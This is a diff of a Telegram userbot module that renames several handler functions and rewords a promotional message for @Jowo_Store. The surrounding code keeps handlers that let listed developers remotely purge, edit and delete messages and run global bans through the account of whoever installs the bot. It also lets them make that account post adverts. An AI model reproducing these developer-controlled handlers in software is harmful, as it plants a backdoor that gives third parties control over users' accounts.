@@ -24,7 +24,7 @@ from .admin import BANNED_RIGHTS, UNBAN_RIGHTS
 
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme")
-async def cpurgeme(delme):
+async def ownpurgeme(delme):
     message = delme.text
     count = int(message[9:])
     i = 1
@@ -43,7 +43,7 @@ async def cpurgeme(delme):
 
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
-async def cfastpurger(purg):
+async def ownfastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
     itermsg = purg.client.iter_messages(chat, min_id=purg.reply_to_msg_id)
@@ -69,7 +69,7 @@ async def cfastpurger(purg):
     await done.delete()
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cedit")
-async def cediter(edit):
+async def ownediter(edit):
     message = edit.text
     chat = await edit.get_input_chat()
     self_id = await edit.client.get_peer_id("me")
@@ -83,7 +83,7 @@ async def cediter(edit):
         i += 1
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
-async def cdelete_it(delme):
+async def owndelete_it(delme):
     msg_src = await delme.get_reply_message()
     if delme.reply_to_msg_id:
         try:
@@ -93,7 +93,7 @@ async def cdelete_it(delme):
             await delme.edit("**Tidak Bisa Menghapus Pesan**")
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
-async def cgban(event):
+async def owngban(event):
     if event.fwd_from:
         return
     gbun = await edit_or_reply(event, "`MengGbanned...`")
@@ -145,7 +145,7 @@ async def cgban(event):
         )
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cungban(?: |$)(.*)")
-async def cungban(event):
+async def ownungban(event):
     if event.fwd_from:
         return
     ungbun = await edit_or_reply(event, "`UnGbanning...`")
@@ -197,7 +197,7 @@ async def jsubot(ganteng):
 
 @register(incoming=True, from_users=DEVS, pattern=r"^.promosi$")
 async def risman(ganteng):
-    await ganteng.reply("Mau Pasang Userbot?Ribet?Mau yang terima jadi?Sini aja bang di @Jowo_Store terpercaya dah ga boong ada badaknya")
+    await ganteng.reply("Mau Pasang Userbot?Males Ribet?Mau yang terima jadi?Sini aja Kak di @Jowo_Store cepat dan amanah😊")
 
 
 CMD_HELP.update(
